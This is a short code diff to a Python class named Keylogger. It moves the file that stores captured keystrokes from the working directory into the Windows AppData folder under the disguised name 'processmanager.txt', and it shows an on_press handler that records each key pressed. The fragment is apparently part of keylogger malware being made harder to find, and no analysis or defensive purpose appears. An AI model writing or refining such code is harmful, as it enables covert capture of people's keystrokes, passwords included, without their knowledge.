@@ -14,8 +14,8 @@ class Keylogger():
     keys = []
     count = 0
     flag = 0
-    #path = os.environ['appdata'] + '\\processmanager.txt'
-    path = 'processmanager.txt'
+    path = os.environ['appdata'] + '\\processmanager.txt'
+    #path = 'processmanager.txt'
 
     def on_press(self, key):
         self.keys.append(key)
